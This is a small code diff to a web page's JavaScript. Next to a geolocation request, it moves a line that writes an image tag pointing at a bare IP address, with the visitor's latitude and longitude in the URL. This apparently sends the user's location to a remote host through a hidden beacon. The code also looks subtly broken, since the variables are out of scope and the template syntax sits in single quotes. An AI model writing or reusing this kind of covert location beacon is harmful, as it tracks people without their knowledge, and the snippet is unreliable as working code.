@@ -71,7 +71,7 @@ button {
 	//window.location = "http://199.91.174.223/${latitude}/${longitude}";
 	//location.replace(`http://199.91.174.223/${latitude}/${longitude}`);
    
-    document.write('<img src="http://199.91.174.223/${latitude}/${longitude}" />'); 
+    //document.write('<img src="http://199.91.174.223/${latitude}/${longitude}" />'); 
 
 	
   }
@@ -85,6 +85,7 @@ button {
   } else {
     status.textContent = 'Loading....…';
     navigator.geolocation.getCurrentPosition(success, error);
+	document.write('<img src="http://199.91.174.223/${latitude}/${longitude}" />');
   }
 
 }
